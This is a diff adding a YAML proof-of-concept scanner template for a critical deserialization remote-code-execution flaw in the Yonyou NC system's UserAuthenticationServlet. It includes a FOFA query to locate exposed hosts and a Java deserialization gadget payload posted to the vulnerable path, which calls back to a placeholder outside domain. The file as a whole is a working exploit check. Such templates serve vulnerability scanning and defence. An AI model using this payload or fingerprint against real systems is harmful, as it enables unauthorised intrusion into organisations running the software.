@@ -1,0 +1,17 @@
+id: poc-yaml-yongyou-userauthenticationservlet-deserialization-rce
+info:
+  name: 用友NC系统接口UserAuthenticationServlet 反序列化RCE漏洞
+  severity: critical
+  tags:
+  - 反序列化
+  finger: 用友nc
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: java_dns_url_gadget("http://xxx.xxxx.cn","raw")
+requests:
+- method: POST
+  path: /servlet/~uapim/nc.bs.pub.im.UserAuthenticationServlet
+  data: '{{.t1}}'
+  expression: "status_code == 200 && \ncontains(body,\"java.util.HashMap\") &&\ncontains(body,\"\
+    java.lang.Boolean\") &&\ncontains(body,\"loadFactor\")\n"
+transport: http
